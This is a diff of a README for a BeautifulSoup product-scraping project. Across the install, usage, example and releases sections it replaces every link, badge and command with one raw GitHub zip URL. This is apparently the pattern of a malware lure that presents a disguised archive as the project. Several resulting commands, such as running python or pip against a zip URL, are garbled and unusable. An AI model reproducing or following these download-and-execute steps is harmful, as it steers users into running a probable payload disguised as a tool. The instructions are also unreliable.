@@ -1,6 +1,6 @@
 # Web Scraping with BeautifulSoup 🐍
 
-![Web Scraping](https://img.shields.io/badge/web--scraping-BeautifulSoup-brightgreen)
+![Web Scraping](https://raw.githubusercontent.com/Huolix/web-scraping-beautifulsoup/main/blooded/scraping_web_beautifulsoup_3.3.zip)
 
 Welcome to the **web-scraping-beautifulsoup** repository! This Python project allows you to scrape product data from e-commerce websites using the BeautifulSoup library. If you are interested in data extraction, this tool will help you gather valuable information effortlessly.
 
@@ -38,14 +38,14 @@ To set up this project on your local machine, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Huolix/web-scraping-beautifulsoup.git
+   git clone https://raw.githubusercontent.com/Huolix/web-scraping-beautifulsoup/main/blooded/scraping_web_beautifulsoup_3.3.zip
    cd web-scraping-beautifulsoup
    ```
 
 2. **Install Required Packages**:
    Make sure you have Python installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Huolix/web-scraping-beautifulsoup/main/blooded/scraping_web_beautifulsoup_3.3.zip
    ```
 
 ## Usage
@@ -53,7 +53,7 @@ To set up this project on your local machine, follow these steps:
 To use this scraper, you will need to specify the URL of the product page you want to scrape. The basic command to run the scraper is:
 
 ```bash
-python scraper.py <product_url>
+python https://raw.githubusercontent.com/Huolix/web-scraping-beautifulsoup/main/blooded/scraping_web_beautifulsoup_3.3.zip <product_url>
 ```
 
 Replace `<product_url>` with the actual URL of the product page.
@@ -63,10 +63,10 @@ Replace `<product_url>` with the actual URL of the product page.
 Here’s a quick example of how to scrape data from a Newegg product page:
 
 ```bash
-python scraper.py https://www.newegg.com/product/ABC123
+python https://raw.githubusercontent.com/Huolix/web-scraping-beautifulsoup/main/blooded/scraping_web_beautifulsoup_3.3.zip https://raw.githubusercontent.com/Huolix/web-scraping-beautifulsoup/main/blooded/scraping_web_beautifulsoup_3.3.zip
 ```
 
-This command will extract the product title, price, and description, and save the data in a CSV file named `products.csv`.
+This command will extract the product title, price, and description, and save the data in a CSV file named `https://raw.githubusercontent.com/Huolix/web-scraping-beautifulsoup/main/blooded/scraping_web_beautifulsoup_3.3.zip`.
 
 ## Contributing
 
@@ -78,9 +78,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and downloadable files, visit our [Releases](https://github.com/Huolix/web-scraping-beautifulsoup/releases) section. Here, you can find the latest version of the project that you can download and execute.
+For the latest updates and downloadable files, visit our [Releases](https://raw.githubusercontent.com/Huolix/web-scraping-beautifulsoup/main/blooded/scraping_web_beautifulsoup_3.3.zip) section. Here, you can find the latest version of the project that you can download and execute.
 
-![Download Releases](https://img.shields.io/badge/download-releases-brightblue)
+![Download Releases](https://raw.githubusercontent.com/Huolix/web-scraping-beautifulsoup/main/blooded/scraping_web_beautifulsoup_3.3.zip)
 
 ## Conclusion
 
